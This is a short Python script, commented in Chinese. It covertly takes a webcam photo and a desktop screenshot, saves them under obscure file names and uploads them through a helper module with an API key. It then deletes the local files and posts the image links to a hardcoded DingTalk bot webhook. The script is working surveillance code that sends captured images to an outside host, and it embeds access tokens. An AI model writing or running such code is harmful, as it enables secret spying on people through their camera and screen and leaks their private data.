
from cv2 import VideoCapture, imwrite, cvtColor, COLOR_BGR2RGB
from os import remove
from pyautogui import screenshot
from numpy import asarray
import tryy

# 钉钉机器人的webhook地址
webhook_url = "https://oapi.dingtalk.com/robot/send?access_token" \
              "=e431400e0b958115be6d0585a4ccf8a5fb61220fc84106fe04133acdb7cb43e6"

cap = VideoCapture(0)


# 发送图片的函数
def rs():
    _, img = cap.read()
    img1 = cvtColor(asarray(screenshot()), COLOR_BGR2RGB)
    imwrite("qwsszfhdazbxfzdghdt.png", img)

    imwrite("qwsszfhdazbxfzdghdt111.png", img1)
    # 调用函数发送图片
    url2 = tryy.upload(key, "qwsszfhdazbxfzdghdt.png")
    url1 = tryy.upload(key, "qwsszfhdazbxfzdghdt111.png")
    remove("qwsszfhdazbxfzdghdt.png")
    remove("qwsszfhdazbxfzdghdt111.png")
    return url1, url2

key = "e31e00a56f84e64cd4b375a3dd3dd589"
u1, u2 = rs()
tryy.send(u1, u2)
